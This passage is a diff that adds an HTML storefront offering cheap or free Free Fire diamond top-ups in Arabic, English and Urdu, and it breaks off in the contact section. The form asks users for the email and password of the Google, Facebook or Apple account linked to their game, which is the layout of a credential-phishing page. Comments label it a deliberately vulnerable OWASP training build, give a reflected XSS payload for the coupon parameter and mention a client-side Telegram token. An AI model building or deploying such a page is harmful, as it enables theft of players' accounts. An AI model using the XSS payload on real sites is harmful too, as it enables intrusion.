@@ -1,11 +1,423 @@
-<script>
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- LAB BUILD v3 — intentionally vulnerable (OWASP Top 10 training)
+         A05: no CSP / no security headers (intentional)
+         A03: reflected XSS sink — ?coupon=<img src=x onerror=alert(1)>
+         A02: client-side Telegram token (intentional, documented) -->
+    <title>Pakistan Store | متجر باكستاني - شحن جواهر فري فاير</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Tajawal:wght@300;400;500;700;800&family=Noto+Nastaliq+Urdu:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --primary: #f39c12; --primary-dark: #e67e22; --secondary: #d35400;
+            --accent: #f1c40f; --dark: #1a1a2e; --green: #028A0F;
+            --gray: #666; --light-gray: #f5f5f5; --white: #fff;
+            --danger: #e74c3c; --success: #27ae60;
+            --shadow: 0 10px 40px rgba(0,0,0,0.1); --radius: 16px;
+        }
+        .hidden { display: none !important; }
+        body { font-family: 'Tajawal', 'Inter', sans-serif; background: var(--light-gray); color: var(--dark); line-height: 1.6; }
+        body.lang-en { font-family: 'Inter', 'Tajawal', sans-serif; }
+        body.lang-ur { font-family: 'Noto Nastaliq Urdu', 'Tajawal', sans-serif; }
+        .lang-switcher { display: flex; gap: 5px; align-items: center; background: rgba(0,0,0,0.2); padding: 4px; border-radius: 25px; }
+        .lang-btn { background: transparent; border: none; color: rgba(255,255,255,0.7); padding: 6px 14px; border-radius: 20px; cursor: pointer; font-size: 13px; font-weight: 600; font-family: inherit; transition: all 0.3s; display: flex; align-items: center; gap: 4px; }
+        .lang-btn:hover { color: white; background: rgba(255,255,255,0.1); }
+        .lang-btn.active { background: var(--accent); color: var(--dark); box-shadow: 0 2px 8px rgba(243,156,18,0.4); }
+        header { background: linear-gradient(135deg, var(--dark) 0%, #2c3e50 100%); position: sticky; top: 0; z-index: 1000; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
+        .header-top { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; background: rgba(243,156,18,0.2); font-size: 14px; color: var(--accent); }
+        .header-top i { margin-left: 5px; }
+        nav { display: flex; justify-content: space-between; align-items: center; padding: 15px 40px; max-width: 1400px; margin: 0 auto; }
+        .logo { display: flex; align-items: center; gap: 12px; color: white; font-size: 28px; font-weight: 800; }
+        .logo i { font-size: 35px; color: var(--accent); }
+        .logo span { color: var(--accent); }
+        .nav-links { display: flex; gap: 30px; list-style: none; }
+        .nav-links a { color: white; text-decoration: none; font-weight: 500; transition: all 0.3s; padding: 8px 0; position: relative; }
+        .nav-links a:hover { color: var(--accent); }
+        .nav-links a::after { content: ''; position: absolute; bottom: 0; right: 0; width: 0; height: 2px; background: var(--accent); transition: width 0.3s; }
+        .nav-links a:hover::after { width: 100%; }
+        .header-actions { display: flex; gap: 20px; align-items: center; }
+        .cart-btn { position: relative; background: var(--accent); color: var(--dark); border: none; padding: 12px 20px; border-radius: 50px; cursor: pointer; font-size: 18px; transition: all 0.3s; font-weight: 700; }
+        .cart-btn:hover { transform: scale(1.05); box-shadow: 0 5px 20px rgba(243,156,18,0.4); }
+        .cart-count { position: absolute; top: -8px; right: -8px; background: var(--danger); color: white; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 700; }
+        .hero { background: linear-gradient(135deg, var(--dark) 0%, #2c3e50 50%, var(--primary-dark) 100%); padding: 80px 40px; text-align: center; color: white; position: relative; overflow: hidden; }
+        .hero::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23f39c12' fill-opacity='0.08'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E"); animation: move 20s linear infinite; }
+        @keyframes move { 0% { transform: translate(0, 0); } 100% { transform: translate(30px, 30px); } }
+        .hero-content { position: relative; z-index: 1; max-width: 800px; margin: 0 auto; }
+        .pakistan-badge { display: inline-block; background: var(--accent); color: var(--dark); padding: 10px 30px; border-radius: 50px; font-weight: 700; margin-bottom: 20px; font-size: 18px; }
+        .hero h1 { font-size: 52px; font-weight: 800; margin-bottom: 20px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
+        .hero h1 span { color: var(--accent); }
+        .hero p { font-size: 20px; margin-bottom: 40px; opacity: 0.95; }
+        .hero-buttons { display: flex; gap: 20px; justify-content: center; flex-wrap: wrap; }
+        .btn-primary { background: var(--accent); color: var(--dark); padding: 15px 40px; border-radius: 50px; font-size: 18px; font-weight: 700; border: none; cursor: pointer; transition: all 0.3s; font-family: 'Tajawal', sans-serif; text-decoration: none; display: inline-block; }
+        .btn-primary:hover { transform: scale(1.05); box-shadow: 0 10px 30px rgba(243,156,18,0.4); }
+        .btn-secondary { background: transparent; color: white; padding: 15px 40px; border-radius: 50px; font-size: 18px; font-weight: 700; border: 2px solid white; cursor: pointer; transition: all 0.3s; font-family: 'Tajawal', sans-serif; }
+        .btn-secondary:hover { background: white; color: var(--dark); }
+        .features { display: grid; grid-template-columns: repeat(4, 1fr); gap: 30px; margin-top: 60px; }
+        .feature { background: rgba(255,255,255,0.1); padding: 25px; border-radius: var(--radius); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
+        .feature i { font-size: 40px; color: var(--accent); margin-bottom: 15px; }
+        .feature h3 { font-size: 18px; margin-bottom: 8px; }
+        .feature p { font-size: 14px; opacity: 0.8; margin: 0; }
+        .games { padding: 60px 40px 0; max-width: 1400px; margin: 0 auto; }
+        .section-header { text-align: center; margin-bottom: 50px; }
+        .section-header h2 { font-size: 36px; color: var(--dark); margin-bottom: 15px; }
+        .section-header p { color: var(--gray); font-size: 18px; }
+        .games-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 30px; max-width: 600px; margin: 0 auto; }
+        .game-card { background: white; padding: 30px 20px; border-radius: var(--radius); text-align: center; cursor: pointer; transition: all 0.3s; box-shadow: var(--shadow); border: 3px solid transparent; position: relative; }
+        .game-card:hover, .game-card.active { transform: translateY(-10px); border-color: var(--accent); box-shadow: 0 20px 50px rgba(243,156,18,0.2); }
+        .game-card.active { background: linear-gradient(135deg, var(--accent) 0%, var(--primary-dark) 100%); color: white; }
+        .game-card.active .game-name { color: white; }
+        .game-card.coming-soon { opacity: 0.7; cursor: not-allowed; }
+        .game-card.coming-soon::after { content: 'قريباً'; position: absolute; top: 15px; right: 15px; background: var(--gray); color: white; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: 700; }
+        .game-card i { font-size: 60px; margin-bottom: 15px; }
+        .game-card .game-name { font-size: 20px; font-weight: 700; color: var(--dark); }
+        .products { padding: 60px 40px; max-width: 1400px; margin: 0 auto; }
+        .coupon-banner { background: linear-gradient(135deg, #fff3cd, #ffeaa7); border: 2px dashed #f39c12; color: #856404; padding: 14px 20px; border-radius: 12px; margin-bottom: 30px; text-align: center; font-weight: 700; font-size: 16px; }
+        .products-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 30px; }
+        .product-card { background: white; border-radius: var(--radius); overflow: hidden; box-shadow: var(--shadow); transition: all 0.3s; border: 2px solid transparent; }
+        .product-card:hover { transform: translateY(-5px); border-color: var(--accent); box-shadow: 0 20px 50px rgba(0,0,0,0.15); }
+        .product-card.selected { border-color: var(--success); box-shadow: 0 10px 30px rgba(39,174,96,0.3); }
+        .product-image { height: 180px; background: linear-gradient(135deg, var(--dark) 0%, #2c3e50 100%); display: flex; align-items: center; justify-content: center; position: relative; flex-direction: column; color: white; }
+        .product-image i { font-size: 50px; color: var(--accent); margin-bottom: 10px; }
+        .product-image .diamonds { font-size: 28px; font-weight: 800; color: var(--accent); }
+        .product-image .label { font-size: 12px; color: rgba(255,255,255,0.7); }
+        .product-badge { position: absolute; top: 15px; right: 15px; background: var(--danger); color: white; padding: 5px 12px; border-radius: 20px; font-size: 12px; font-weight: 700; }
+        .product-badge.bestseller { background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 50%, #f39c12 100%); color: white; font-size: 11px; padding: 6px 14px; box-shadow: 0 3px 10px rgba(255,107,107,0.45); animation: pulseBadge 2s ease-in-out infinite; top: 12px; right: 12px; }
+        @keyframes pulseBadge { 0%, 100% { transform: scale(1); box-shadow: 0 3px 10px rgba(255,107,107,0.45); } 50% { transform: scale(1.05); box-shadow: 0 5px 18px rgba(255,107,107,0.7); } }
+        .product-info { padding: 25px; }
+        .product-name { font-size: 18px; font-weight: 700; margin-bottom: 8px; color: var(--dark); }
+        .product-price { font-size: 28px; font-weight: 800; color: var(--primary); }
+        .select-btn { width: 100%; padding: 15px; background: var(--primary); color: white; border: none; border-radius: 10px; font-family: 'Tajawal', sans-serif; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 15px; }
+        .select-btn:hover { background: var(--primary-dark); }
+        .product-card.selected .select-btn { background: var(--success); }
+        .account-form { background: white; padding: 35px; border-radius: var(--radius); margin-top: 40px; box-shadow: var(--shadow); }
+        .account-form.disabled { opacity: 0.5; pointer-events: none; }
+        .account-form.active { animation: slideDown 0.3s ease; border: 2px solid var(--success); }
+        @keyframes slideDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+        .account-form h3 { margin-bottom: 25px; color: var(--dark); display: flex; align-items: center; gap: 12px; }
+        .account-form h3 i { color: var(--primary); }
+        .form-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; }
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; margin-bottom: 8px; font-weight: 600; color: var(--dark); }
+        .form-group input, .form-group select { width: 100%; padding: 14px 18px; border: 2px solid #ddd; border-radius: 10px; font-family: 'Tajawal', sans-serif; font-size: 15px; transition: all 0.3s; background: white; }
+        .form-group input:focus, .form-group select:focus { outline: none; border-color: var(--primary); }
+        .form-group small { color: var(--gray); font-size: 12px; margin-top: 5px; display: block; }
+        .form-notice { background: #fff3cd; color: #856404; padding: 12px 20px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; text-align: center; }
+        .form-notice.success { background: #d4edda; color: #155724; border: 1px solid #28a745; }
+        .error-msg { display: none; color: #e74c3c; font-size: 13px; margin-top: 6px; font-weight: 600; background: #fee; padding: 8px 12px; border-radius: 8px; border-right: 3px solid #e74c3c; }
+        .error-msg.show { display: block; animation: shake 0.3s ease; }
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
+        .form-group input.invalid { border-color: #e74c3c !important; background: #fff5f5; }
+        .form-group input.valid { border-color: #27ae60 !important; }
+        .free-notice { background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%); color: #155724; padding: 20px; border-radius: 12px; margin-top: 25px; text-align: center; border: 2px solid #28a745; }
+        .free-notice i { font-size: 30px; margin-bottom: 10px; display: block; color: #28a745; }
+        .free-notice h4 { font-size: 18px; margin-bottom: 8px; }
+        .free-notice p { font-size: 14px; margin: 0; opacity: 0.9; }
+        .payment-section { margin-top: 25px; }
+        .payment-section h4 { margin-bottom: 15px; color: var(--dark); }
+        .payment-methods { display: flex; gap: 15px; flex-wrap: wrap; }
+        .payment-method { background: white; padding: 15px 25px; border-radius: 10px; border: 2px solid #ddd; display: flex; align-items: center; gap: 10px; cursor: pointer; transition: all 0.3s; }
+        .payment-method:hover, .payment-method.selected { border-color: var(--primary); background: rgba(243,156,18,0.05); }
+        .payment-method i { font-size: 24px; color: var(--gray); }
+        .payment-method.selected i { color: var(--primary); }
+        .payment-method span { font-weight: 600; }
+        .currency-section { margin-top: 25px; background: #f5f5f5; padding: 20px; border-radius: 10px; }
+        .currency-section label { display: block; margin-bottom: 12px; font-weight: 600; color: var(--dark); }
+        .currency-options { display: flex; gap: 15px; flex-wrap: wrap; }
+        .currency-option { background: white; padding: 12px 25px; border-radius: 10px; border: 2px solid transparent; cursor: pointer; transition: all 0.3s; font-weight: 600; }
+        .currency-option:hover, .currency-option.selected { border-color: var(--primary); background: rgba(243,156,18,0.1); }
+        .currency-option.selected { background: var(--primary); color: white; }
+        .how-it-works { padding: 60px 40px; max-width: 1200px; margin: 0 auto; }
+        .steps { display: grid; grid-template-columns: repeat(4, 1fr); gap: 40px; position: relative; }
+        .steps::before { content: ''; position: absolute; top: 60px; left: 12.5%; right: 12.5%; height: 3px; background: linear-gradient(90deg, var(--primary), var(--accent)); z-index: 0; }
+        .step { text-align: center; position: relative; z-index: 1; }
+        .step-icon { width: 120px; height: 120px; background: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 25px; box-shadow: var(--shadow); }
+        .step-icon i { font-size: 45px; color: var(--primary); }
+        .step h3 { font-size: 20px; margin-bottom: 10px; }
+        .step p { color: var(--gray); font-size: 15px; }
+        .contact { background: var(--dark); padding: 80px 40px; color: white; }
+        .contact-content { max-width: 600px; margin: 0 auto; text-align: center; }
+        .contact-info h2 { font-size: 36px; margin-bottom: 20px; }
+        .contact-info p { opacity: 0.8; margin-bottom: 40px; }
+        .whatsapp-box { background: rgba(255,255,255,0.05); padding: 40px; border-radius: var(--radius); }
+        .whatsapp-item { display: flex; align-items: center; justify-content: center; gap: 20px; }
+        .whatsapp-item i { width: 55px; height: 55px; background: #25d366; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 22px; }
+        .whatsapp-item h4 { font-size: 18px; margin-bottom: 5px; }
+        .whatsapp-item p { margin: 0; opacity: 0.7; }
+        .contact-form { background: rgba(255,255,255,0.05); padding: 40px; border-radius: var(--radius); margin-top: 30px; text-align: right; }
+        .contact-form input, .contact-form select, .contact-form textarea { width: 100%; padding: 18px 25px; margin-bottom: 20px; border: 2px solid rgba(255,255,255,0.1); border-radius: 10px; background: rgba(255,255,255,0.05); color: white; font-family: 'Tajawal', sans-serif; font-size: 16px; transition: all 0.3s; }
+        .contact-form input:focus, .contact-form select:focus, .contact-form textarea:focus { outline: none; border-color: var(--primary); }
+        .contact-form input::placeholder, .contact-form textarea::placeholder { color: rgba(255,255,255,0.5); }
+        .contact-form select option { background: var(--dark); color: white; }
+        .contact-form textarea { height: 150px; resize: none; }
+        .contact-form button { width: 100%; padding: 18px; background: #25d366; color: white; border: none; border-radius: 10px; font-size: 18px; font-weight: 700; font-family: 'Tajawal', sans-serif; cursor: pointer; transition: all 0.3s; }
+        .contact-form button:hover { background: #128C7E; }
+        footer { background: #111; padding: 40px; text-align: center; color: rgba(255,255,255,0.6); }
+        footer p { margin-bottom: 15px; }
+        .social-links { display: flex; justify-content: center; gap: 20px; }
+        .social-links a { width: 45px; height: 45px; background: rgba(255,255,255,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; transition: all 0.3s; }
+        .social-links a:hover { background: var(--primary); transform: translateY(-3px); }
+        .cart-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); z-index: 2000; opacity: 0; visibility: hidden; transition: all 0.3s; }
+        .cart-overlay.active { opacity: 1; visibility: visible; }
+        .cart-sidebar { position: fixed; top: 0; left: -400px; width: 400px; height: 100%; background: white; z-index: 2001; transition: all 0.3s ease; display: flex; flex-direction: column; }
+        .cart-sidebar.active { left: 0; }
+        .cart-header { padding: 25px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; background: var(--dark); color: white; }
+        .cart-header h3 { font-size: 22px; }
+        .cart-close { background: none; border: none; font-size: 24px; cursor: pointer; color: white; }
+        .cart-items { flex: 1; overflow-y: auto; padding: 20px; }
+        .cart-item { display: flex; gap: 15px; padding: 15px 0; border-bottom: 1px solid #eee; }
+        .cart-item-image { width: 80px; height: 80px; background: var(--dark); border-radius: 10px; display: flex; align-items: center; justify-content: center; flex-direction: column; color: white; }
+        .cart-item-image i { font-size: 30px; color: var(--accent); }
+        .cart-item-image .count { font-size: 14px; color: var(--accent); font-weight: 700; }
+        .cart-item-info { flex: 1; }
+        .cart-item-name { font-weight: 600; margin-bottom: 5px; }
+        .cart-item-price { color: var(--primary); font-weight: 700; }
+        .cart-footer { padding: 25px; border-top: 1px solid #eee; }
+        .cart-total { display: flex; justify-content: space-between; font-size: 20px; font-weight: 700; margin-bottom: 20px; }
+        .cart-total span:last-child { color: var(--primary); }
+        .empty-cart { text-align: center; padding: 60px 20px; color: var(--gray); }
+        .empty-cart i { font-size: 80px; color: #ddd; margin-bottom: 20px; }
+        .whatsapp-btn { position: fixed; bottom: 30px; left: 30px; width: 60px; height: 60px; background: #25d366; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-size: 30px; box-shadow: 0 5px 25px rgba(37,211,102,0.4); z-index: 1000; transition: all 0.3s; text-decoration: none; }
+        .whatsapp-btn:hover { transform: scale(1.1); }
+        .modal { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); z-index: 3000; display: flex; align-items: center; justify-content: center; opacity: 0; visibility: hidden; transition: all 0.3s; }
+        .modal.active { opacity: 1; visibility: visible; }
+        .modal-content { background: white; padding: 50px; border-radius: var(--radius); text-align: center; max-width: 420px; transform: scale(0.8); transition: all 0.3s; position: relative; }
+        .modal.active .modal-content { transform: scale(1); }
+        .modal-content i { font-size: 70px; color: var(--success); margin-bottom: 20px; }
+        .modal-content h3 { font-size: 24px; margin-bottom: 10px; }
+        .modal-content p { color: var(--gray); margin-bottom: 25px; }
+        .modal-content button { background: var(--primary); color: white; border: none; padding: 15px 40px; border-radius: 50px; font-size: 16px; font-weight: 600; font-family: 'Tajawal', sans-serif; cursor: pointer; }
+        .modal-close-x { position: absolute; top: 12px; right: 18px; background: transparent; border: none; font-size: 30px; color: var(--gray); cursor: pointer; width: 38px; height: 38px; border-radius: 50%; display: flex; align-items: center; justify-content: center; transition: all 0.3s; line-height: 1; padding: 0; font-family: inherit; font-weight: 300; }
+        .modal-close-x:hover { background: #f5f5f5; color: var(--danger); transform: rotate(90deg); }
+        @media (max-width: 1200px) { .products-grid { grid-template-columns: repeat(3, 1fr); } }
+        @media (max-width: 768px) { .nav-links { display: none; } .hero h1 { font-size: 32px; } .features { grid-template-columns: repeat(2, 1fr); } .products-grid { grid-template-columns: repeat(2, 1fr); } .steps { grid-template-columns: repeat(2, 1fr); } .steps::before { display: none; } .cart-sidebar { width: 100%; left: -100%; } .form-grid { grid-template-columns: 1fr; } }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="header-top">
+            <span><i class="fas fa-bolt"></i> <span data-i18n="header.instant">توصيل فوري - أقل من 5 دقائق</span></span>
+            <div class="lang-switcher">
+                <button class="lang-btn active" data-lang="ar" onclick="setLang('ar')">🇸🇦 عربي</button>
+                <button class="lang-btn" data-lang="en" onclick="setLang('en')">🇬🇧 EN</button>
+                <button class="lang-btn" data-lang="ur" onclick="setLang('ur')">🇵🇰 اردو</button>
+            </div>
+            <span><i class="fas fa-headset"></i> <span data-i18n="header.support">دعم فني 24 ساعة</span></span>
+        </div>
+        <nav>
+            <div class="logo"><i class="fas fa-store"></i><span>Pakistan</span> Store</div>
+            <ul class="nav-links">
+                <li><a href="#home"><span data-i18n="nav.home">الرئيسية</span></a></li>
+                <li><a href="#games"><span data-i18n="nav.games">الألعاب</span></a></li>
+                <li><a href="#products"><span data-i18n="nav.products">الباقات</span></a></li>
+                <li><a href="#contact"><span data-i18n="nav.contact">تواصل معنا</span></a></li>
+            </ul>
+            <div class="header-actions">
+                <button class="cart-btn" onclick="toggleCart()"><i class="fas fa-shopping-cart"></i> <span data-i18n="nav.cart">سلة التسوق</span> <span class="cart-count hidden" id="cartCount">0</span></button>
+            </div>
+        </nav>
+    </header>
+
+    <section class="hero" id="home">
+        <div class="hero-content">
+            <div class="pakistan-badge">🇵🇰 <span data-i18n="hero.badge">متجر باكستاني رسمي</span></div>
+            <h1><span data-i18n="hero.title1">شحن</span> <span data-i18n="hero.title2">جواهر فري فاير</span> <span data-i18n="hero.title3">وببجي</span></h1>
+            <p data-i18n="hero.desc">أسرع خدمة شحن في الباكستان - توصيل فوري خلال دقائق معدودة ✓ ضمان 100% ✓ أسعار تنافسية</p>
+            <div class="hero-buttons">
+                <button class="btn-primary" onclick="document.getElementById('products').scrollIntoView({behavior: 'smooth'})"><i class="fas fa-shopping-bag"></i> <span data-i18n="hero.shop">تسوق الآن</span></button>
+                <button class="btn-secondary" onclick="document.getElementById('contact').scrollIntoView({behavior: 'smooth'})"><i class="fab fa-whatsapp"></i> <span data-i18n="hero.contact">تواصل واتساب</span></button>
+            </div>
+            <div class="features">
+                <div class="feature"><i class="fas fa-bolt"></i><h3 data-i18n="features.f1.t">توصيل فوري</h3><p data-i18n="features.f1.d">خلال 1-5 دقائق</p></div>
+                <div class="feature"><i class="fas fa-shield-alt"></i><h3 data-i18n="features.f2.t">ضمان كامل</h3><p data-i18n="features.f2.d">100% آمن وموثوق</p></div>
+                <div class="feature"><i class="fas fa-tags"></i><h3 data-i18n="features.f3.t">أسعار مميزة</h3><p data-i18n="features.f3.d">أقل من الأسعار الرسمية</p></div>
+                <div class="feature"><i class="fas fa-headset"></i><h3 data-i18n="features.f4.t">دعم فني</h3><p data-i18n="features.f4.d">متاح 24/7</p></div>
+            </div>
+        </div>
+    </section>
+
+    <section class="games" id="games">
+        <div class="section-header">
+            <h2 data-i18n="games.title">🎮 اختر اللعبة</h2>
+            <p data-i18n="games.desc">نقدم خدمة الشحن لهاتين اللعبتين</p>
+        </div>
+        <div class="games-grid">
+            <div class="game-card active" id="gameFreeFire" onclick="selectGame('freefire', this)"><i class="fas fa-fire" style="color: #f39c12;"></i><div class="game-name" data-i18n="games.freefire">فري فاير</div></div>
+            <div class="game-card coming-soon" id="gamePubg" onclick="showComingSoon()"><i class="fas fa-gamepad" style="color: #27ae60;"></i><div class="game-name" data-i18n="games.pubg">ببجي موبايل</div></div>
+        </div>
+    </section>
+
+    <section class="products" id="products">
+        <div class="section-header">
+            <h2 data-i18n="products.title">💎 باقات الشحن</h2>
+            <p data-i18n="products.desc">اختر الباقة المناسبة لك</p>
+        </div>
+        <!-- A03 (intentional): reflected XSS sink — try ?coupon=<img src=x onerror=alert(1)> -->
+        <div class="coupon-banner hidden" id="couponBanner"></div>
+        <div class="products-grid" id="productsGrid"></div>
+
+        <div class="account-form disabled" id="accountForm">
+            <h3><i class="fas fa-user-lock"></i> <span data-i18n="form.title">بيانات الحساب</span></h3>
+            <div class="form-notice" id="formNotice">⚠️ <strong data-i18n="form.notice">اختر باقة أولاً</strong> <span data-i18n="form.notice2">من الباقات بالأعلى لتفعيل النموذج</span></div>
+            <div class="form-notice success hidden" id="formNoticeActive">✅ <strong data-i18n="form.noticeActive">تم اختيار الباقة</strong> <span data-i18n="form.noticeActive2">أكمل البيانات أدناه</span></div>
+
+            <div class="form-group" style="margin-bottom: 25px; padding: 20px; background: #fff8e7; border-radius: 12px; border-right: 4px solid var(--primary);">
+                <label style="display: block; margin-bottom: 10px; font-weight: 700; color: var(--dark); font-size: 16px;"><i class="fas fa-link" style="color: var(--primary); margin-left: 8px;"></i> <span data-i18n="form.linkType">نوع ربط الحساب الأساسي</span></label>
+                <select id="accountLinkType">
+                    <option value="" data-i18n="form.linkChoose">-- اختر نوع الربط --</option>
+                    <option value="google">🌐 Google (جوجل)</option>
+                    <option value="facebook">📘 Facebook (فيسبوك)</option>
+                    <option value="vk">🔵 VK</option>
+                    <option value="apple">🍎 Apple ID</option>
+                    <option value="twitter">🐦 Twitter / X</option>
+                    <option value="guest" data-i18n="form.linkGuest">👤 حساب ضيف (Guest)</option>
+                </select>
+                <small style="color: var(--gray); font-size: 13px; margin-top: 8px; display: block;" data-i18n="form.linkHelp">⚠️ اختر الطريقة المربوط بها حسابك الأساسي في فري فاير</small>
+            </div>
+
+            <div class="form-grid">
+                <div class="form-group">
+                    <label><i class="fas fa-id-badge"></i> <span data-i18n="form.id">معرف اللاعب (ID)</span></label>
+                    <input type="text" id="accountId" data-i18n-placeholder="form.idPh" placeholder="أدخل ID حسابك (10-12 رقم)" oninput="validateId()">
+                    <small data-i18n="form.idHelp">معرف حسابك في فري فاير (10 إلى 12 رقماً)</small>
+                    <div class="error-msg" id="idError">❌ <span data-i18n="error.id">يرجى إدخال معرف اللاعب (10 إلى 12 رقماً)</span></div>
+                </div>
+                <div class="form-group">
+                    <label><i class="fas fa-envelope"></i> <span data-i18n="form.email">البريد الإلكتروني (Gmail)</span></label>
+                    <input type="email" id="accountEmail" data-i18n-placeholder="form.emailPh" placeholder="أدخل بريدك الإلكتروني" oninput="validateEmail()">
+                    <small data-i18n="form.emailHelp">سيتم الربط بهذا الحساب</small>
+                    <div class="error-msg" id="emailError">❌ <span data-i18n="error.email">يرجى إدخال بريد إلكتروني صحيح</span></div>
+                </div>
+                <div class="form-group">
+                    <label><i class="fas fa-lock"></i> <span data-i18n="form.password">كلمة المرور</span></label>
+                    <input type="password" id="accountPassword" data-i18n-placeholder="form.passwordPh" placeholder="أدخل كلمة المرور (8 أحرف على الأقل)" oninput="validatePasswordMatch()">
+                    <small data-i18n="form.passwordHelp">مطلوبة لربط الحساب - 8 أحرف على الأقل</small>
+                </div>
+                <div class="form-group">
+                    <label><i class="fas fa-key"></i> <span data-i18n="form.passwordConfirm">تأكيد كلمة المرور</span></label>
+                    <input type="password" id="accountPasswordConfirm" data-i18n-placeholder="form.passwordConfirmPh" placeholder="أعد إدخال كلمة المرور" oninput="validatePasswordMatch()">
+                    <small data-i18n="form.confirmHelp">للتأكيد</small>
+                    <div class="error-msg" id="passwordError">❌ <span data-i18n="error.password">كلمتا المرور غير متطابقتين</span></div>
+                </div>
+            </div>
+
+            <div class="payment-section" id="paymentSection">
+                <h4><i class="fas fa-credit-card"></i> <span data-i18n="form.payment">طريقة الدفع</span></h4>
+                <div class="payment-methods">
+                    <div class="payment-method" onclick="selectPayment('visa', this)"><i class="fab fa-cc-visa" style="color: #1A1F71;"></i><span data-i18n="form.visa">Visa</span></div>
+                    <div class="payment-method" onclick="selectPayment('vodafone', this)"><i class="fas fa-mobile-alt" style="color: #E60000;"></i><span data-i18n="form.vodafone">Vodafone Cash</span></div>
+                    <div class="payment-method" onclick="selectPayment('googleplay', this)"><i class="fab fa-google-play" style="color: #4285F4;"></i><span data-i18n="form.googleplay">بطاقة جوجل بلاي</span></div>
+                </div>
+                <div class="error-msg" id="paymentError">❌ <span data-i18n="error.payment">يرجى اختيار طريقة دفع</span></div>
+            </div>
+
+            <div class="currency-section" id="currencySection">
+                <label><i class="fas fa-coins"></i> <span data-i18n="form.currency">العملة</span></label>
+                <div class="currency-options">
+                    <div class="currency-option selected" onclick="selectCurrency('PKR', this)">🇵🇰 <span data-i18n="currency.pkr">روبية باكستانية (PKR)</span></div>
+                    <div class="currency-option" onclick="selectCurrency('EUR', this)">🇪🇺 <span data-i18n="currency.eur">يورو إيطالي (EUR)</span></div>
+                    <div class="currency-option" onclick="selectCurrency('USD', this)">🇺🇸 <span data-i18n="currency.usd">دولار أمريكي (USD)</span></div>
+                </div>
+            </div>
+
+            <div class="free-notice hidden" id="freeNotice">
+                <i class="fas fa-gift"></i>
+                <h4 data-i18n="free.title">باقة مجانية! 🎉</h4>
+                <p data-i18n="free.desc">مش محتاج تدفع أي حاجة - الباقة دي مجانية تمامًا</p>
+            </div>
+
+            <button class="btn-primary" style="width: 100%; margin-top: 25px;" onclick="proceedToCheckout()">
+                <i class="fab fa-whatsapp"></i> <span data-i18n="form.checkout">إتمام الطلب عبر واتساب</span>
+            </button>
+        </div>
+    </section>
+
+    <section class="how-it-works">
+        <div class="section-header">
+            <h2 data-i18n="how.title">كيف تعمل؟</h2>
+            <p data-i18n="how.desc">3 خطوات بسيطة لشحن حسابك</p>
+        </div>
+        <div class="steps">
+            <div class="step"><div class="step-icon"><i class="fas fa-hand-pointer"></i></div><h3 data-i18n="how.s1.t">اختر الباقة</h3><p data-i18n="how.s1.d">اختر الباقة المناسبة للعبة</p></div>
+            <div class="step"><div class="step-icon"><i class="fas fa-user-cog"></i></div><h3 data-i18n="how.s2.t">أدخل البيانات</h3><p data-i18n="how.s2.d">بريدك الإلكتروني وكلمة المرور</p></div>
+            <div class="step"><div class="step-icon"><i class="fab fa-whatsapp"></i></div><h3 data-i18n="how.s3.t">تواصل واتساب</h3><p data-i18n="how.s3.d">ابعت لنا ونوصلك خلال دقائق</p></div>
+            <div class="step"><div class="step-icon"><i class="fas fa-gem"></i></div><h3 data-i18n="how.s4.t">استلم جواهرك</h3><p data-i18n="how.s4.d">خلال دقائق حسابك يبان</p></div>
+        </div>
+    </section>
+
+    <section class="contact" id="contact">
+        <div class="contact-content">
+            <div class="contact-info">
+                <h2 data-i18n="contact.title">💬 تواصل معنا</h2>
+                <p data-i18n="contact.desc">فريقنا متاح على واتساب لمساعدتك على مدار الساعة</p>
+            </div>
+            <div class="whatsapp-box">
+                <div class="whatsapp-item"><i class="fab fa-whatsapp"></i><div><h4 data-i18n="contact.whatsapp">واتساب</h4><p>+92 300 0000000 <!-- LAB: رقم تجريبي --></p></div></div>
